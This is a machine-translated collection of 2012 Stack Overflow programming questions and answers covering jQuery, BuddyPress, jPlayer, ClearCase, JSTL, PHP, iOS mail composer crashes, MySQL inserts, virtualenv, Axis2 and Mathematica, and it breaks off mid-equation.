我写了一些在 iSeries 服务器上工作的 Java 程序。它可以处理对该服务器的所有 Http 请求。我还编写了在本地计算机上打开的 Html 页面，我对 iSeries 服务器使用了一些 jQuery (Ajax) 请求，我想从正在运行的程序中获取一些数据。

我的服务器程序看到它收到一些带有所有参数等的请求（POST 和 GET）并对其作出响应。

不幸的是，jQuery 无法读取答案数据，而在连接到 iSeries 服务器的本地计算机上编写和运行的简单 Java 程序可以读取来自该服务器的所有响应。

如何在 Java 中编写可供 jQuery 读取的响应？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:08:27.633

使用 jQuery 在客户端处理[JSON](http://json.org/)格式的数据非常容易。尝试对服务器端进行编程，以 JSON 格式返回数据。

# wordpress - 如何使用 bp_member_profile_data 从配置文件信息中获取字段

> ID：11735048
> 
> 赞同：0
> 
> 时间：2012-07-31T07:18:37.023
> 
> 标签：wordpress, buddypress

我在尝试使用此 buddypress 代码时遇到一些困难：

```
 <?php $args = array(
            'field'   => 'Location',   
            'user_id' => $curauth->ID           
        ); ?>
   <?php  bp_member_profile_data($args); ?> 
```

它只是没有为我显示任何东西。难道我做错了什么？。我在作者 wordpress 页面中运行此代码。非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T08:19:03.080

这应该工作：

```
<?php 
 $location = xprofile_get_field_data( "Location" , $curauth->ID );  
?> 
```

实际上它肯定有效，因为我用过几次！:)

我从来没有使用过这个函数`bp_member_profile_data($args)`，但我猜它只能在循环中工作。

我希望这有帮助！

# jquery - 使用 jquery 插件播放 wav 文件

> ID：11735051
> 
> 赞同：1
> 
> 时间：2012-07-31T07:18:45.350
> 
> 标签：jquery, wav, jplayer

我正在使用 Jplayer 插件来播放音频文件。它播放 mp3 文件，但不支持 wav 音频文件。我已经搜索了原因并知道 wav 音频文件应该是特定格式才能使用 flash 或 HTML 5 播放。但我的 wav 文件的比特率是 64 kbps。如何播放这种格式的 wav 音频文件，例如将 wav 转换为合适的格式并播放该文件。是否有任何插件可以播放任何格式的 wav 文件或插件将 wav 转换为合适的格式以便能够播放文件或任何替代方案？能够与 JPlayer 插件一起玩的比特率应该是多少。

我有以下用于播放 wav 文件的代码：

```
<script type="text/javascript">
$(document).ready(function(){

    $("#jquery_jplayer_1").jPlayer({
        ready: function (event) {
            $(this).jPlayer("setMedia", {
                mp3:"play.mp3",
                wav:"testtest.wav"
            });
        },
        swfPath: "js",
        supplied: "mp3, wav, m4a, oga",
        wmode: "window"
    });
});
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-02-20T12:59:25.750

[您可以在http://sox.sourceforge.net/](http://sox.sourceforge.net/)下载 SOX，将您的 wav 文件转换为所需的不同比特率。

试试这个转换语法：`sox input.wav -t raw -r 8000 -e a-law -b 16 -c 1 output.wav`并用 FireFox 测试一下看看。祝你好运！

# clearcase - 在 clearcase 中计算每个用户的签到次数

> ID：11735052
> 
> 赞同：1
> 
> 时间：2012-07-31T07:18:47.757
> 
> 标签：clearcase, cleartool

我想在特定时间范围内获得每个用户的总签到次数。这是我正在寻找的结果：

用户：xxxxx 计数：432 用户：yyyyy 计数：22

ETC

我可以使用 find 列出用户完成的所有签到，但我只对计数感兴趣！

编辑：一次查找每个（已知）用户的签到次数也可以！编辑：我还需要过滤某个文件类型，例如 *.java ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:44:04.037

基本上，您需要使用[查询语言](http://publib.boulder.ibm.com/infocenter/cchelp/v7r0m0/topic/com.ibm.rational.clearcase.cc_ref.doc/topics/query_language.htm)[`cleartool find`](http://publib.boulder.ibm.com/infocenter/cchelp/v7r0m0/topic/com.ibm.rational.clearcase.cc_ref.doc/topics/ct_find.htm)中的指令进行试验，例如：

**`created_since`**：例如，这限制了 5 月份的查询：

```
cleartool find . –version "{brtype(main_dev) && created_since(30-Apr) && (! created_since(31-May)) }" -print 
```

**`-user (login-name)`**：对于给定用户的一段时间内的此限制

```
cleartool find . -user user1 -element "{created_since(date1) && !created_since(date2)}" -print 
```

所以基本上，您需要处理查找查询的结果，以便按用户和文件扩展名对其进行排序。

* * *

唯一的*本机*工具（因此不包括外部非免费第三方工具）将尝试使用[ClearCase 报告生成器](http://publib.boulder.ibm.com/infocenter/cchelp/v7r0m0/index.jsp?topic=/com.ibm.rational.clearcase.cc_proj.doc/c_rpt_ch.htm)（或“报告向导”），看看您是否可以设置正确的过滤器。[（在“应用给定标签类型的文件的 ClearCase 列表](https://stackoverflow.com/a/2464597/6309)
”中提到）。

# java - 如何更新中的值 在 a 中使用 EL 标记 标签

> ID：11735059
> 
> 赞同：11
> 
> 时间：2012-07-31T07:19:05.007
> 
> 标签：java, jsp, jstl, el

我有`list`其中包含一些对象。对象有一个`hours`字段。

在`<c:foreach>`我正在迭代列表并获取对象。

现在我想总结一个变量`hours`中所有迭代对象的字段。`totalHours`

我的代码：

```
<c:forEach var="attendance" items="${list }" varStatus="rowCounter1">
  <tr>
    <td><c:out value="${rowCounter1.count}"></c:out></td>
    <td><c:out value="${attendance.date }"></c:out></td>
    <td><c:out value="${attendance.inTime }"></c:out></td>
    <td><c:out value="${attendance.outTime }"></c:out></td>
    <td><c:out value="${attendance.interval }"></c:out></td>

    <c:set var="totalHours" value="${attendance.Hours += attendance.Hours }"
           target="${attendance}"</c:set>                                       
  </tr>
</c:forEach> 
```

我正在尝试这个，但它给了我以下错误：

```
javax.el.ELException: Failed to parse the expression [${attendance.Hours += attendance.Hours } 
```

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-07-31T07:33:21.373

在 Java 中，它看起来像这样：

```
// before the loop:
int totalHours = 0;
for (Attendance attendance : list) {
    totalHours = totalHours + attendance.getHours();
} 
```

所以在 JSTL 中做同样的事情：

```
<c:set var="totalHours" value="${0}"/>
<c:forEach var="attendance" items="${list }" varStatus="rowCounter1">
    ...
    <c:set var="totalHours" value="${totalHours + attendance.hours}"/>
</c:forEach> 
```

# php - Autofill email input box in php

> ID：11735061
> 
> 赞同：0
> 
> 时间：2012-07-31T07:19:14.153
> 
> 标签：php, html-email, email, autofill

i want to send certain emails to my clients and a link is provided in those emails(something like a activation email to active your account), when users click on that link they are directed to a page on my website , that page has a email input box.

I want that when they click on that link and get redirected to my site the input field should be automatically filled with email from where user has clicked the link.(note the user need not be signed in on my site)

Any way i can do this , im using PHP

Thank you

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:23:41.010

well you can pass some data in URL e.g Correspodant ID and then look up the database which ID to be AUTOFilled...

Alternatively you can merge Email id in URL and put that in email and then when user HIT that URL the correspondant email ID will be part of the URL as query string that you can read and put in textbox.

```
let's use your example 
http://www.example.com/example.php?id=USEREMAIL

you could access the value of the variable id in the $_GET array like so

echo $_GET['USEREMAIL'];

this would output "UserEmail". It is common to pull these into a local variable such as

$myid = $_GET['USEREMAIL'];

this would be the some syntax for any var in your url, take this example

http://www.example.com/example.php?AutoFillEmail=developerjigar@gmail.com&start=40&section=mysupercat

$myid = $_GET['AutoFillEmail']; 
$start = $_GET['start']; 
$section = $_GET['section']; 
```

Hope you understand

# iphone - MFMailComposeViewController在iOS5中dismissModalViewControllerAnimated时崩溃

> ID：11735066
> 
> 赞同：4
> 
> 时间：2012-07-31T07:19:23.463
> 
> 标签：iphone, ios, mfmailcomposeviewcontroller, presentmodalviewcontroller

我在我的 conde 中使用 MFMailComposeViewController 来提供邮件功能，但是在发送邮件之后或者当我想取消邮件时它会崩溃。

下面是我的代码：

```
(IBAction)FnForPlutoSupportEmailButtonPressed:(id)sender {
{
    if ([MFMailComposeViewController canSendMail])
    {
        MFMailComposeViewController *mailer = [[MFMailComposeViewController alloc] init];

        mailer.mailComposeDelegate = self;

        [mailer setSubject:@"Need help from Pluto support team"];

        NSArray *toRecipients = [NSArray arrayWithObjects:@"support@myplu.to",nil];
        [mailer setToRecipients:toRecipients];

        NSString *emailBody = @"";

        [mailer setMessageBody:emailBody isHTML:NO];

        //mailer.modalPresentationStyle = UIModalPresentationPageSheet;

        [self presentModalViewController:mailer animated:YES];

    }
    else
    {
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Failure"
                                                        message:@"Your device doesn't support the composer sheet"
                                                       delegate:nil
                                              cancelButtonTitle:@"OK"
                                              otherButtonTitles: nil];
        [alert show];
    }
} }

    (void)mailComposeController:(MFMailComposeViewController*)controller didFinishWithResult:(MFMailComposeResult)result error:(NSError*)error
{
// Notifies users about errors associated with the interface    
switch (result)
    {       case MFMailComposeResultCancelled:
                        break;
                    case MFMailComposeResultSaved:
                        break;
                    case MFMailComposeResultSent:
                        break;
                    case MFMailComposeResultFailed:
                        break;
                    default:
                        break;
    } 
    [self dismissModalViewControllerAnimated:YES];
     } 
```

我已经阅读了所有博客文章，但没有找到解决方案，[这篇](http://tinymission.com/blog/blogengine.web/post/2011/10/27/iOS5-Upgrade-Nightmares.aspx)博客文章对此有很好的解释，但据此我没有在 viewdidload 或 viewdidappear 中展示我的视图控制器。

我正在获取 EXE_BAD_ACCESS，以下是崩溃日志：

**

```
> #0  0x00000000 in ?? ()
> #1  0x01dc5aa4 in -[UIViewController _setViewAppearState:isAnimating:] ()
> #2  0x01dc5f47 in -[UIViewController __viewDidDisappear:] ()
> #3  0x01dc6039 in -[UIViewController _endAppearanceTransition:] ()
> #4  0x01dd2e7e in -[UIViewController(UIContainerViewControllerProtectedMethods) endAppearanceTransition] ()
> #5  0x01fc8de1 in -[UIWindowController transitionViewDidComplete:fromView:toView:] ()
> #6  0x01da334b in -[UITransitionView notifyDidCompleteTransition:] ()
> #7  0x01da3070 in -[UITransitionView _didCompleteTransition:] ()
> #8  0x01da531b in -[UITransitionView _transitionDidStop:finished:] ()
> #9  0x01d23fb6 in -[UIViewAnimationState sendDelegateAnimationDidStop:finished:] ()
> #10 0x01d24154 in -[UIViewAnimationState animationDidStop:finished:] ()
> #11 0x0163bbce in CA::Layer::run_animation_callbacks ()
> #12 0x03664fe4 in _dispatch_client_callout ()
> #13 0x03655997 in _dispatch_main_queue_callback_4CF ()
> #14 0x012c03b5 in __CFRunLoopRun ()
> #15 0x012bf804 in CFRunLoopRunSpecific ()
> #16 0x012bf6db in CFRunLoopRunInMode ()
> #17 0x030f1913 in GSEventRunModal ()
> #18 0x030f1798 in GSEventRun ()
> #19 0x01ce82c1 in UIApplicationMain () 
```

**

根据苹果为 ios 5 更新的文档，他们提到：

presentModalViewController：动画：

向用户呈现由给定视图控制器管理的模态视图。（已弃用。`presentViewController:animated:completion:`改为使用。）

```
- (void)presentModalViewController:(UIViewController *)modalViewController animated:(BOOL)animated
Parameters 
```

关闭接收者呈现的视图控制器。（已弃用。`dismissViewControllerAnimated:completion:`改为使用。）

```
- (void)dismissModalViewControllerAnimated:(BOOL)animated 
```

我也试过这个，但它仍然崩溃

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T17:22:43.893

您需要在您的班级中保留对 MFMailComposeViewController *mailer 的强引用，并且在您关闭它之后，您可以将该引用设为空。问我怎么知道的:-)

```
@implememtation MyClass
{
    MFMailComposeViewController *mailer;
}
...

(IBAction)FnForPlutoSupportEmailButtonPressed:(id)sender {
{
    if ([MFMailComposeViewController canSendMail])
    {
        /* USE IVAR */mailer = [[MFMailComposeViewController alloc] init]; 
```

稍后，当完全使用它时，您只需“mailer = nil;” 释放它。

编辑：我所做的和建议是在主队列中使用一个块来进行发布。如果你只是使用'self.mailer = nil'，那么释放会在最终委托方法完成之后发生，你肯定不再使用它。

EDIT2：这种崩溃并非总是在所有设备上发生 - 我会说它在您收到最终委托方法和完成工作之间有点竞争条件。Apple 没有说明以一种或另一种方式保存引用 - 但是，Apple 产品的一般做法是假设您获得的任何对象都是通过一个 runLoop “借出”的，此后如果您想保留引用，您必须保留对象。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-23T06:15:48.003

如果您在代码中实现了 sharekit 框架，请转到 SHK.m 并更改

```
 [[currentView parentViewController] dismissModalViewControllerAnimated:YES]; 
```

到

```
 [currentView  dismissModalViewControllerAnimated:YES]; 
```

这将解决您的问题。

谢谢大家的回复。

并评论这些行

```
SHKSwizzle([MFMailComposeViewController class], @selector(viewDidDisappear:), @selector(SHKviewDidDisappear:));
if (NSClassFromString(@"MFMessageComposeViewController") != nil) SHKSwizzle([MFMessageComposeViewController class], @selector(viewDidDisappear:), @selector(SHKviewDidDisappear:)); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-08T20:29:03.857

嗨，您可以使用以下代码发送邮件邮件应用程序不会发送任何电子邮件表单模拟器，您必须在设备上安装您的应用程序。当您尝试访问它们不在内存中的对象时会出现 EXE_BAD_ACCESS，并且 remamber 设备区分大小写。

```
-(void)sendMail:(id)sender
{
    //create instance of class at runtime.
    Class mailComposer = (NSClassFromString(@"MFMailComposeViewController"));
if (mailClass != nil)
{
        // check the current device is configured for sending emails
        //if it is not configured for mail you open mail application on device.
    if ([mailClass canSendMail])
    {
        [self displayComposerSheet];
    }
    else
    {
        [self launchMailAppOnDevice];
    }
}
else
{
    [self launchMailAppOnDevice];
}

}
-(void)displayComposerSheet 
 {
MFMailComposeViewController *mailPicker = [[MFMailComposeViewController alloc] init];
picker.mailComposeDelegate = self;

[picker setSubject:@"Welcome!"];

    //recipients

NSArray *to = [NSArray arrayWithObject:@"jhon@example.com"];  

[picker setToRecipients:toRecipients];

    // Attach an image
NSString *filePath = [[NSBundle mainBundle] pathForResource:@"Default" ofType:@"png"];
NSData *imageData = [NSData dataWithContentsOfFile:filePath];
[picker addAttachmentData:myData mimeType:@"image/png" fileName:@"Default"];

    // Set email body text
    //NSString *emailBody = @"......!";
    //[picker setMessageBody:emailBody isHTML:NO];

[self presentModalViewController:picker animated:YES];
[picker release];
}

- (void)mailComposeController:(MFMailComposeViewController*)controller didFinishWithResult:   (MFMailComposeResult)result error:(NSError*)error 
{   
message.hidden = NO;
    // Notifies users about errors associated with the interface
switch (result)
{

    case MFMailComposeResultCancelled:
        message.text = @"Canceled";
        break;
    case MFMailComposeResultSaved:
        message.text = @"Saved";
        break;
    case MFMailComposeResultSent:
        message.text = @"Sent";
        break;
    case MFMailComposeResultFailed:
        message.text = @"Failed";
        break;
    default:
        message.text = @"Not sent";
        break;
}
[self dismissModalViewControllerAnimated:YES];
}

-(void)launchMailAppOnDevice
{
NSString *recipients = @"";
NSString *body = @"";

NSString *email1 = [NSString stringWithFormat:@"%@%@", recipients, body];
email1 = [email1 stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];

[[UIApplication sharedApplication] openURL:[NSURL URLWithString:email1]];
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-13T07:35:38.873

由于堆栈的停止是`0x00000000`，我假设 UIKit 中的一些代码正在跳转到一个 nil 函数指针。启用 Zombies 并查看是否收到僵尸对象访问错误。（编辑您的项目方案，在运行/调试，诊断选项卡下，选中“启用僵尸对象”）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-31T09:04:45.927

试试这个代码，这很好用，不会崩溃..联系我们方法是按钮目标选择器..

```
 -(void)ContactUs:(UIButton*)button
    {
        Class mailClass = (NSClassFromString(@"MFMailComposeViewController"));
        if (mailClass != nil)
        {
            // We must always check whether the current device is configured for sending emails
            if ([mailClass canSendMail])
            {
                [self displayComposerSheet];
            }
            else
            {
                [self launchMailAppOnDevice];
            }
        }
        else
        {
            [self launchMailAppOnDevice];
        }

    }

-(void)displayComposerSheet 
{
    MFMailComposeViewController *picker = [[MFMailComposeViewController alloc] init];
    picker.mailComposeDelegate = self;

    //[picker setSubject:@"Hello from California!"];

    // Set up recipients

    NSArray *toRecipients = [NSArray arrayWithObject:@"info@imp.co.in"]; 
    //NSArray *ccRecipients = [NSArray arrayWithObjects:@"second@example.com", @"third@example.com", nil]; 
    //NSArray *bccRecipients = [NSArray arrayWithObject:@"fourth@example.com"]; 

    [picker setToRecipients:toRecipients];
    //[picker setCcRecipients:ccRecipients];    
    //[picker setBccRecipients:bccRecipients];

    // Attach an image to the email
    /*NSString *path = [[NSBundle mainBundle] pathForResource:@"rainy" ofType:@"png"];
     NSData *myData = [NSData dataWithContentsOfFile:path];
     [picker addAttachmentData:myData mimeType:@"image/png" fileName:@"rainy"];*/

    // Fill out the email body text
    //NSString *emailBody = @"It is raining in sunny California!";
    //[picker setMessageBody:emailBody isHTML:NO];

    [self presentModalViewController:picker animated:YES];
    [picker release];
}
- (void)mailComposeController:(MFMailComposeViewController*)controller didFinishWithResult:(MFMailComposeResult)result error:(NSError*)error 
{   
    message.hidden = NO;
    // Notifies users about errors associated with the interface
    switch (result)
    {

        case MFMailComposeResultCancelled:
            message.text = @"Canceled";
            break;
        case MFMailComposeResultSaved:
            message.text = @"Saved";
            break;
        case MFMailComposeResultSent:
            message.text = @"Sent";
            break;
        case MFMailComposeResultFailed:
            message.text = @"Failed";
            break;
        default:
            message.text = @"Not sent";
            break;
    }
    [self dismissModalViewControllerAnimated:YES];
}

-(void)launchMailAppOnDevice
{
    NSString *recipients = @"";
    NSString *body = @"";

    NSString *email1 = [NSString stringWithFormat:@"%@%@", recipients, body];
    email1 = [email1 stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding];

    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:email1]];
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-08-09T03:39:11.250

如果您使用 ARC，控制器对象将在您调用解除之前被释放。

将对象保留在堆栈分配变量之外的某个位置。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-13T11:11:22.470

您是否在 .h 文件中设置了委托 MFMailComposeViewControllerDelegate。我过去曾遇到过这样的问题。而且错误非常小。请检查 .h 文件中的委托。

# php - 如何有效地为一个变化的列插入完全相同的行？

> ID：11735071
> 
> 赞同：2
> 
> 时间：2012-07-31T07:19:33.647
> 
> 标签：php, mysql, insert

除了字段之外，我必须对`INSERT`完全相同的行执行多个 s，该`recipient`字段的值对于每一行都不同。`for/each`没有在 PHP 中`INSERT`对同一行执行循环但`recipient`在每次迭代中更改字段，有没有办法在 MySQL 中更有效地解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:28:30.430

我认为您可以在 MySQL 中编写一个`stored procedure`使用单个查询调用在同一个表上进行多次插入。例如

```
CREATE PROCEDURE sp_insert_data
(
 arg_col VARCHAR(255)
,arg_recipient_val_1 VARCHAR(255)
,arg_recipient_val_2 VARCHAR(255)
)
BEGIN
    INSERT INTO my_table(col, recipient)
    VALUES(arg_col, arg_recipient_val_1),
          (arg_col, arg_recipient_val_2);
END; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:29:16.223

我认为您需要仔细阅读[此处的链接](http://dev.mysql.com/doc/refman/5.0/en/insert-speed.html)。您可以同时插入[多行](http://dev.mysql.com/doc/refman/5.5/en/insert.html)，这将使重用变量变得非常容易：

```
INSERT INTO tbl_name (a,b,c) VALUES(1,2,3),(4,5,6),(7,8,9); 
```

有很多技巧可以做。

*   首先，锁定表以加快插入过程。
*   其次，您可以使用多插入语法快速插入行。

SQL 代码示例如下。

```
LOCK TABLES a WRITE;
INSERT INTO a VALUES (1,23),(2,34),(4,33);
INSERT INTO a VALUES (8,26),(6,29);
...
UNLOCK TABLES; 
```

在 SQL 效率方面，甚至不看[替换成](http://dev.mysql.com/doc/refman/5.0/en/replace.html)语法。

*请注意，REPLACE INTO 的执行速度比 UPDATE 语句慢得多。请记住，REPLACE INTO 需要对键进行测试，如果在任何或所有列上找到匹配的唯一键，则执行 DELETE FROM，然后执行 INSERT。这涉及到很多行管理，如果你经常这样做，你会损害你的性能，除非你根本无法使用任何其他语法。*

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T07:38:02.803

你有几个选择。但是，您是否会获得效率是您必须进行基准测试的事情。

方法1：首先在一个批次中插入所有行，然后在第二个循环上运行更新查询。

我不喜欢这种方法，因为尝试运行第二组更新查询会降低效率。

但是由于您将使用 PHP 来运行查询，所以我建议使用方法 2。

方法二：

1.  构建一个字符串以包含多个插入值。

    插入 MyTable (Field1, Field2, ... Field-N) 值 (Value1, Value2, Value3, ... Value-N), (Value1, Value2, Value3, ... Value-N), (Value1, Value2 , 值 3, ... 值-N)

    您可以在此处将字符串构建为相当大的大小。我过去已经为 10,000 条记录构建了它。

2.  **通过调用mysql_query**函数执行查询。

3.  返回第 1 步，直到没有更多记录要插入。

如果您有大量插入，此方法非常好。但重要的是要记住，必须捕获插入中的失败以确保插入正确的记录**。****理想情况下，事务提交将与mysql_affected_rows**函数一起帮助解决这个问题。

最后，如果您的数字不是那么好，请构建一个较小的字符串。如果您的总记录只有大约 50 条左右，只需将它们单独插入即可。

# iphone - JSON 响应在 iPhone 中第二次为空

> ID：11735072
> 
> 赞同：0
> 
> 时间：2012-07-31T07:19:34.893
> 
> 标签：iphone, ios, json, response

在`connectionDidFinishLaunching`方法中，

我正在写这个，

在`ViewWillAppear`

```
NSURLRequest *request = [NSURLRequest requestWithURL:url];
[NSURLConnection connectionWithRequest:request delegate:self]; 
```

并且在

```
-(void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data 
```

我正在获取数据...我将其放入字符串...

```
NSString *responsestring=[[NSString alloc] initWithData:self.receivedData encoding:NSUTF8StringEncoding];
NSLog(@"responsestring is %@",responsestring);
NSMutableDictionary *dict = [responsestring JSONValue];
MKCoordinateRegion region = { {0.0, 0.0 }, { 0.0, 0.0 } }; 
```

第一次调用 web 服务时 ---> 我在字典中得到了正确的数据。

当我去另一个视图控制器并回到同一个地方时--->`viewWillAppear`被调用。在字符串中，正确的值即将出现..请求中的 url`ViewWillAppear`也是相同的..但是在`self.dict= [responsestring JSONValue];`我得到这个时间之后是 null ..

这怎么可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:24:47.920

这是因为您没有保留字典。如果您以后想使用该词典，您应该保留它。

# python - 激活的 VENV 仍然使用系统 pip 和系统 python？怎么了？

> ID：11735073
> 
> 赞同：6
> 
> 时间：2012-07-31T07:19:36.210
> 
> 标签：python, virtualenv, pip

当我激活 a`venv`时，`which pip`返回`/usr/local/bin/pip`而不是`path/to/my/apps/venv/bin/pop`. 这是为什么？

我倾向于只`rm- rf`插入`/usr/local/bin/pip`并再次安装，但由于这是一个生产服务器，我不想猜测太多:-)

我担心的是我有（在 usr/local/bin 中）：

*   简易安装
*   easy_install-2.6
*   点子
*   点子2.6
*   虚拟环境
*   虚拟环境-2.6

`python --version`返回 2.6.6 并`which python`返回`/usr/bin/python`，即使`venv`已激活？

运行 Debian Squeeze

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T18:01:50.320

检查您的 virtualenv 以获取`local`目录。如果`venv/local`存在，它是否包含`pip`and `easy_install`？如果是这样，您可以尝试通过编辑`venv/bin/activate`和预先添加`venv/local/bin`到您的路径来解决此问题，就像`venv/bin`预先添加一样。

就像是：

```
_OLD_VIRTUAL_PATH="$PATH"
PATH="$VIRTUAL_ENV/bin:$PATH"
PATH="$VIRTUAL_ENV/local/bin:$PATH"  # my new line
export PATH 
```

我遇到了类似于我所描述的问题，不幸的是我还没有将它运行到地面。另请参阅：[为什么要分发和 pip 安装到我的 virtualenv 的 ./local/bin？](https://stackoverflow.com/questions/15370872/why-do-distribute-and-pip-install-to-my-virtualenvs-local-bin)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:23:43.570

你用的是什么外壳？您使用什么特定命令来激活 virtualenv？

就我而言（也使用挤压），我使用的是 bash，如果我运行“source bin/activate”，那么我路径中的所有内容（pip、python 等）都是正确的。

# java - AXIS2 对 WEBService 的基本身份验证

> ID：11735074
> 
> 赞同：1
> 
> 时间：2012-07-31T07:19:38.123
> 
> 标签：java, axis2

我正在使用 Eclispe，我正在创建动态项目，我还使用axis2创建存根，在访问url时我需要做一些基本的AUTHENTICATE，如何在java中做到这一点

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:26:32.823

您可以在 web.xml 中使用安全约束（假设您使用 Tomcat 进行部署）。

这意味着您可以过滤允许访问 Web 服务的人员。

[此处的问题对Tomcat安全访问](https://stackoverflow.com/questions/6332966/tomcat-secure-access)进行了一般性了解

[Tomcat：绕过指定 IP 地址的基本身份验证](https://stackoverflow.com/questions/7631974/tomcat-bypass-basic-authentication-for-specified-ip-address)

您可以使用用户名和密码，或按 IP 过滤

# iphone - 数组始终显示 iphone 应用程序中所有索引值中的索引值

> ID：11735075
> 
> 赞同：0
> 
> 时间：2012-07-31T07:19:44.727
> 
> 标签：iphone, objective-c, xcode, ipad

我有一个数组，我在其中插入了 sqlite 中所有不同的值并存储在表中，但是当我访问数组时，它显示所有数组 indexex 的相同值我在数组中有四个项目

这就是我添加项目的方式

```
 for (int i = 0; i<[surveyQuestions count]; i++) {

      QuestionData*data=[surveyQuestions objectAtIndex:i];

      question_text=data.question_text;
      question_type=data.question_type;

      coffeeObj.question_text =question_text;
      coffeeObj.question_type=question_type;

      NSLog(@"Inserted question %@",question_text);

       [appDelegate addCoffee:coffeeObj];

      }

 - (void) addCoffee:(QuestionData *)coffeeObj {

    [coffeeObj addCoffee];

    [coffeeArray addObject:coffeeObj];

    NSLog(@"Succeessfully Added");

    }

for(int j=0;j<countmine;j++)
{
     QuestionData*data=[appDelegate.coffeeArray objectAtIndex:j];
     NSString*myTest=data.question_text;
     NSLog(myTest);
     QuestionData*dataset=[appDelegate.coffeeArray objectAtIndex:0];
     questionTextLabel.text=dataset.question_text;
} 
```

在数据库中，我正在添加数组，但它始终显示数据库中每个索引中的最后一个输入值

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:21:42.730

您在将值分配给 questionTextLabel 时使用了索引 0。你应该在这里使用“j”。

```
//In your answer its 0 here
 QuestionData*dataset=[appDelegate.coffeeArray objectAtIndex:j];     

 questionTextLabel.text=dataset.question_text; 
```

# math - 在 Mathematica 中求解非线性方程组

> ID：11735078
> 
> 赞同：4
> 
> 时间：2012-07-31T07:19:49.263
> 
> 标签：math, wolfram-mathematica, numerical-methods, numerical, nonlinear-functions

我正在尝试解决 Mathemtica 中的非线性方程组。我尝试了 Solve 和 NSolve，我还尝试定义 a_{ij} 和 b_{ij} 和 m33=1 数值来简化方程，但是 Mathematica 似乎工作时间过长或者我做错了什么。在 Mathematica 我只是想找到解决方案，但我还需要一些 c/c++ 库来在我的代码中执行此操作。

“运算符”中的主要方程：

```
M[A[(x,y)]]=B[M[(x,y)]] 
```

其中“运算符”是透视变换：

```
u= (m13 + m11*x + m12*y)/(m33 + m31*x + m32*y); 

v= (m23 + m21*x +m22*y)/(m33 + m31*x + m32*y); 
```

我在 Mathematica 中的输入：

```
Solve[(b13 + (b11 (m13 + m11 x1 + m12 y1))/(m33 + m31 x1 + 
         m32 y1) + (b12 (m23 + m21 x1 + m22 y1))/(m33 + m31 x1 + 
         m32 y1))/(b33 + (b31 (m13 + m11 x1 + m12 y1))/(m33 + m31 x1 +
          m32 y1) + (b32 (m23 + m21 x1 + m22 y1))/(m33 + m31 x1 + 
         m32 y1)) == (m13 + (m11 (a13 + a11 x1 + a12 y1))/(a33 + 
         a31 x1 + a32 y1) + (m12 (a23 + a21 x1 + a22 y1))/(a33 + 
         a31 x1 + a32 y1))/(m33 + (m31 (a13 + a11 x1 + a12 y1))/(a33 +
          a31 x1 + a32 y1) + (m32 (a23 + a21 x1 + a22 y1))/(a33 + 
         a31 x1 + 
         a32 y1)) && (b23 + (b21 (m13 + m11 x1 + m12 y1))/(m33 + 
         m31 x1 + m32 y1) + (b22 (m23 + m21 x1 + m22 y1))/(m33 + 
         m31 x1 + m32 y1))/(b33 + (b31 (m13 + m11 x1 + m12 y1))/(m33 +
          m31 x1 + m32 y1) + (b32 (m23 + m21 x1 + m22 y1))/(m33 + 
         m31 x1 + 
         m32 y1)) == (m23 + (m21 (a13 + a11 x1 + a12 y1))/(a33 + 
         a31 x1 + a32 y1) + (m22 (a23 + a21 x1 + a22 y1))/(a33 + 
         a31 x1 + a32 y1))/(m33 + (m31 (a13 + a11 x1 + a12 y1))/(a33 +
          a31 x1 + a32 y1) + (m32 (a23 + a21 x1 + a22 y1))/(a33 + 
         a31 x1 + 
         a32 y1)) && (b13 + (b11 (m13 + m11 x2 + m12 y2))/(m33 + 
         m31 x2 + m32 y2) + (b12 (m23 + m21 x2 + m22 y2))/(m33 + 
         m31 x2 + m32 y2))/(b33 + (b31 (m13 + m11 x2 + m12 y2))/(m33 +
          m31 x2 + m32 y2) + (b32 (m23 + m21 x2 + m22 y2))/(m33 + 
         m31 x2 + 
         m32 y2)) == (m13 + (m11 (a13 + a11 x2 + a12 y2))/(a33 + 
         a31 x2 + a32 y2) + (m12 (a23 + a21 x2 + a22 y2))/(a33 + 
         a31 x2 + a32 y2))/(m33 + (m31 (a13 + a11 x2 + a12 y2))/(a33 +
          a31 x2 + a32 y2) + (m32 (a23 + a21 x2 + a22 y2))/(a33 + 
         a31 x2 + 
         a32 y2)) && (b23 + (b21 (m13 + m11 x2 + m12 y2))/(m33 + 
         m31 x2 + m32 y2) + (b22 (m23 + m21 x2 + m22 y2))/(m33 + 
         m31 x2 + m32 y2))/(b33 + (b31 (m13 + m11 x2 + m12 y2))/(m33 +
          m31 x2 + m32 y2) + (b32 (m23 + m21 x2 + m22 y2))/(m33 + 
         m31 x2 + 
         m32 y2)) == (m23 + (m21 (a13 + a11 x2 + a12 y2))/(a33 + 
         a31 x2 + a32 y2) + (m22 (a23 + a21 x2 + a22 y2))/(a33 + 
         a31 x2 + a32 y2))/(m33 + (m31 (a13 + a11 x2 + a12 y2))/(a33 +
